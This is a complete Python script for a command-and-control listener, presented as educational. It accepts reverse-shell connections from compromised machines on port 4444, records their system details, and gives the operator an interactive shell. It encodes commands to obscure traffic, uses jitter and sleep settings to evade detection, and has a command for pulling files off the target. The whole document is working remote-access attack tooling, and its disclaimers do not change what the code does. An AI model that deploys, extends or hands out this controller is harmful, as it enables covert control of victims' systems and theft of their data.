#!/usr/bin/env python3
import socket
import time
import random
import base64
import json
import os
import sys
import argparse
import signal
import hashlib
import logging
from datetime import datetime
from typing import Dict, Optional, Any, Union

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('attacker_logs.txt')
    ]
)
logger = logging.getLogger('attacker')

# Educational Note: This is an enhanced attacker script for educational purposes
# It demonstrates various C2 (Command and Control) techniques used in cybersecurity
# Use responsibly and only in controlled environments

class EnhancedListener:
    """C2 listener implementation for educational purposes"""
    
    def __init__(self, ip: str, port: int):
        """
        Initialize the C2 listener
        
        Args:
            ip: IP address to listen on
            port: Port number to listen on
        """
        self.ip = ip
        self.port = port
        self.encoding_enabled = True
        self.heartbeat_interval = 30
        self.jitter = 5
        self.listener = None
        self.conn = None
        self.addr = None
        self.target_info = {}
        self.session_id = self._generate_session_id()
        self.secure_key = self._generate_secure_key()
        self.exit_flag = False
        
    def _generate_session_id(self) -> str:
        """Generate a unique session ID"""
        return hashlib.md5(f"{time.time()}-{random.randint(1000, 9999)}".encode()).hexdigest()[:8]
        
    def _generate_secure_key(self) -> str:
        """Generate a secure key for command encoding"""
        return hashlib.sha256(f"{time.time()}-{random.randint(1000, 999999)}".encode()).hexdigest()[:16]
    
    def encode_command(self, command: str) -> str:
        """
        Encode commands to obfuscate communication
        
        Args:
            command: Command to encode
            
        Returns:
            Encoded command string
        """
        if not self.encoding_enabled:
            return command
        
        # Convert to JSON and encode with base64
        cmd_json = json.dumps({
            "cmd": command,
            "timestamp": time.time(),
            "session_id": self.session_id,
            "signature": hashlib.md5(f"{command}{self.secure_key}".encode()).hexdigest()
        })
        return base64.b64encode(cmd_json.encode()).decode()
    
    def decode_response(self, response: str) -> str:
        """
        Decode the response from target
        
        Args:
            response: Encoded response
            
        Returns:
            Decoded response string
        """
        if not self.encoding_enabled:
            return response
            
        try:
            decoded = base64.b64decode(response).decode()
            response_data = json.loads(decoded)
            
            # Verify response integrity if signature is present
            if "signature" in response_data:
                expected_sig = hashlib.md5(f"{response_data.get('output', '')}{self.secure_key}".encode()).hexdigest()
                if response_data["signature"] != expected_sig:
                    logger.warning("[!] Response signature verification failed")
                    
            return response_data.get("output", "[!] No output field in response")
        except Exception as e:
            logger.error(f"[!] Error decoding response: {e}")
            return f"[!] Error decoding response: {response}"
    
    def send_command(self, command: str) -> Optional[str]:
        """
        Send encoded command to target and receive response
        
        Args:
            command: Command to send
            
        Returns:
            Decoded response or None if error
        """
        try:
            if not self.conn:
                logger.error("[!] No active connection")
                return None
                
            encoded_cmd = self.encode_command(command)
            self.conn.send(encoded_cmd.encode())
            
            # Add random delay to mimic human behavior
            time.sleep(random.uniform(0.1, 0.5))
            
            response = self.conn.recv(8192)
            if not response:
                logger.error("[!] No response from target")
                return None
                
            return self.decode_response(response.decode())
        except Exception as e:
            logger.error(f"[!] Error in communication: {str(e)}")
            return None
    
    def start_listener(self) -> None:
        """Start the listener and wait for connections"""
        
        # Register signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        try:
            self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener.bind((self.ip, self.port))
            self.listener.listen(1)
            logger.info(f"[*] Listener started on {self.ip}:{self.port}")
            logger.info(f"[*] Session ID: {self.session_id}")
            logger.info(f"[*] Press Ctrl+C to exit")
            
            # Set a timeout to allow checking for exit flag
            self.listener.settimeout(1.0)
            
            while not self.exit_flag:
                try:
                    self.conn, self.addr = self.listener.accept()
                    self._handle_connection()
                except socket.timeout:
                    continue
                except Exception as e:
                    if not self.exit_flag:
                        logger.error(f"[!] Connection error: {str(e)}")
                    continue
                
        except Exception as e:
            if not self.exit_flag:
                logger.error(f"[!] Error: {str(e)}")
        finally:
            self.cleanup()
    
    def _handle_connection(self) -> None:
        """Handle an incoming connection"""
        try:
            logger.info(f"[+] Connection received from {self.addr[0]}:{self.addr[1]}")
            
            # Set connection timeout
            self.conn.settimeout(60)
            
            # Receive initial information from target
            initial_data = self.conn.recv(4096).decode()
            try:
                self.target_info = json.loads(initial_data)
                logger.info(f"[+] Target System Information:")
                for key, value in self.target_info.items():
                    logger.info(f"    {key}: {value}")
                
                # Log connection details to file
                self._log_connection()
                
            except json.JSONDecodeError:
                logger.info(f"[+] Target reports: {initial_data}")
            
            self.interactive_shell()
            
        except Exception as e:
            logger.error(f"[!] Error handling connection: {str(e)}")
        finally:
            if self.conn:
                self.conn.close()
                self.conn = None
    
    def _log_connection(self) -> None:
        """Log connection details to a file for record keeping"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_dir = "logs"
            os.makedirs(log_dir, exist_ok=True)
            
            log_file = os.path.join(log_dir, f"connection_{self.session_id}.json")
            
            log_data = {
                "timestamp": timestamp,
                "remote_addr": f"{self.addr[0]}:{self.addr[1]}",
                "session_id": self.session_id,
                "target_info": self.target_info
            }
            
            with open(log_file, 'w') as f:
                json.dump(log_data, f, indent=2)
                
            logger.info(f"[*] Connection details logged to {log_file}")
        except Exception as e:
            logger.error(f"[!] Error logging connection: {str(e)}")
    
    def interactive_shell(self) -> None:
        """Provide interactive shell to send commands"""
        help_text = """
Available commands:
help                  - Show this help menu
exit                  - Close the connection and exit
sleep <seconds>       - Set sleep time between commands
encoding <on|off>     - Toggle command encoding
info                  - Show target information
clear                 - Clear the screen
heartbeat <seconds>   - Set heartbeat interval
history               - Show command history
sysinfo               - Request updated system information
session               - Show current session information
download <remote_path> - Download file from target
jitter <percentage>   - Set jitter factor (0-50)
"""
        command_history = []
        
        while not self.exit_flag:
            try:
                cmd = input("\033[92m$\033[0m ").strip()
                
                # Add to history if not empty
                if cmd and cmd not in ["clear", "history"]:
                    command_history.append(cmd)
                    if len(command_history) > 50:  # Limit history size
                        command_history.pop(0)
                
                # Handle special commands
                if cmd.lower() == "exit":
                    logger.info("[*] Sending exit command to target...")
                    self.send_command("exit")
                    break
                    
                elif cmd.lower() == "help":
                    print(help_text)
                    continue
                    
                elif cmd.lower() == "info":
                    print("[+] Target Information:")
                    for key, value in self.target_info.items():
                        print(f"    {key}: {value}")
                    continue
                    
                elif cmd.lower() == "clear":
                    os.system('cls' if os.name == 'nt' else 'clear')
                    continue
                    
                elif cmd.lower() == "history":
                    print("[+] Command History:")
                    for i, hist_cmd in enumerate(command_history, 1):
                        print(f"    {i:2d}. {hist_cmd}")
                    continue
                    
                elif cmd.lower() == "session":
                    print(f"[+] Session ID: {self.session_id}")
                    print(f"[+] Connected to: {self.addr[0]}:{self.addr[1]}")
                    print(f"[+] Encoding: {'Enabled' if self.encoding_enabled else 'Disabled'}")
                    print(f"[+] Heartbeat interval: {self.heartbeat_interval} seconds")
                    print(f"[+] Jitter: {self.jitter}%")
                    continue
                    
                elif cmd.lower() == "sysinfo":
                    response = self.send_command("sysinfo")
                    if response:
                        try:
                            sys_info = json.loads(response)
                            print("[+] Updated System Information:")
                            for key, value in sys_info.items():
                                print(f"    {key}: {value}")
                                # Update stored info
                                self.target_info[key] = value
                        except:
                            print(response)
                    continue
                    
                elif cmd.lower().startswith("encoding"):
                    parts = cmd.split()
                    if len(parts) > 1:
                        if parts[1].lower() == "on":
                            self.encoding_enabled = True
                            print("[*] Command encoding enabled")
                        elif parts[1].lower() == "off":
                            self.encoding_enabled = False
                            print("[*] Command encoding disabled")
                    print(f"[*] Current encoding status: {'Enabled' if self.encoding_enabled else 'Disabled'}")
                    continue
                    
                elif cmd.lower().startswith("heartbeat"):
                    parts = cmd.split()
                    if len(parts) > 1:
                        try:
                            self.heartbeat_interval = int(parts[1])
                            self.send_command(f"heartbeat {self.heartbeat_interval}")
                            print(f"[*] Heartbeat interval set to {self.heartbeat_interval} seconds")
                        except ValueError:
                            print("[!] Invalid heartbeat interval")
                    continue
                    
                elif cmd.lower().startswith("sleep"):
                    parts = cmd.split()
                    if len(parts) > 1:
                        try:
                            sleep_time = int(parts[1])
                            self.send_command(f"sleep {sleep_time}")
                            print(f"[*] Sleep time set to {sleep_time} seconds")
                        except ValueError:
                            print("[!] Invalid sleep time")
                    continue
                    
                elif cmd.lower().startswith("jitter"):
                    parts = cmd.split()
                    if len(parts) > 1:
                        try:
                            jitter = min(50, max(0, int(parts[1])))  # Limit to 0-50%
                            self.jitter = jitter
                            self.send_command(f"jitter {jitter}")
                            print(f"[*] Jitter factor set to {jitter}%")
                        except ValueError:
                            print("[!] Invalid jitter percentage")
                    continue
                    
                elif cmd.lower().startswith("download"):
                    parts = cmd.split(maxsplit=1)
                    if len(parts) > 1:
                        remote_path = parts[1]
                        self._download_file(remote_path)
                    else:
                        print("[!] Usage: download <remote_path>")
                    continue
                    
                elif not cmd:
                    continue
                    
                # Send regular command and display response
                response = self.send_command(cmd)
                if response:
                    print(response)
                    
            except KeyboardInterrupt:
                print("\n[!] Keyboard interrupt detected. Type 'exit' to quit.")
            except Exception as e:
                logger.error(f"[!] Error: {str(e)}")
    
    def _download_file(self, remote_path: str) -> None:
        """
        Download a file from the target system
        
        Args:
            remote_path: Path to file on target system
        """
        try:
            print(f"[*] Requesting file: {remote_path}")
            
            # Send command to retrieve file content
            response = self.send_command(f"download {remote_path}")
            
            if not response or response.startswith("[!] Error"):
                print(response or "[!] Failed to download file")
                return
                
            try:
                file_data = json.loads(response)
                if "error" in file_data:
                    print(f"[!] {file_data['error']}")
                    return
                    
                if "content" not in file_data or "filename" not in file_data:
                    print("[!] Invalid response format")
                    return
                    
                filename = os.path.basename(file_data["filename"])
                content = base64.b64decode(file_data["content"])
                size = len(content)
                
                # Create downloads directory if it doesn't exist
                download_dir = "downloads"
                os.makedirs(download_dir, exist_ok=True)
                
                # Save to file with timestamp to avoid overwriting
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                save_path = os.path.join(download_dir, f"{timestamp}_{filename}")
                
                with open(save_path, "wb") as f:
                    f.write(content)
                    
                print(f"[+] File downloaded successfully: {save_path}")
                print(f"[+] Size: {size} bytes")
                
            except json.JSONDecodeError:
                print("[!] Invalid response format")
            except Exception as e:
                print(f"[!] Error saving file: {str(e)}")
                
        except Exception as e:
            print(f"[!] Download error: {str(e)}")
    
    def signal_handler(self, sig: int, frame) -> None:
        """Handle interrupt signals gracefully"""
        print("\n[!] Shutdown signal received, exiting...")
        self.exit_flag = True
        self.cleanup()
    
    def cleanup(self) -> None:
        """Clean up resources"""
        if self.conn:
            try:
                self.conn.close()
            except:
                pass
            self.conn = None
            
        if self.listener:
            try:
                self.listener.close()
            except:
                pass
            self.listener = None
            
        logger.info("[*] Listener stopped")


def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description="Enhanced C2 Listener - FOR EDUCATIONAL PURPOSES ONLY")
    parser.add_argument("--ip", "-i", default="0.0.0.0", help="IP address to listen on (default: 0.0.0.0)")
    parser.add_argument("--port", "-p", type=int, default=4444, help="Port to listen on (default: 4444)")
    parser.add_argument("--debug", "-d", action="store_true", help="Enable debug logging")
    return parser.parse_args()


def main() -> None:
    """Main function"""
    print("\n" + "=" * 60)
    print("  ENHANCED C2 LISTENER - FOR EDUCATIONAL PURPOSES ONLY")
    print("=" * 60)
    print("\nWARNING: This tool is for cybersecurity education only.\n")
    
    args = parse_arguments()
    
    if args.debug:
        logger.setLevel(logging.DEBUG)
        
    try:
        listener = EnhancedListener(args.ip, args.port)
        listener.start_listener()
    except Exception as e:
        logger.error(f"[!] Fatal error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()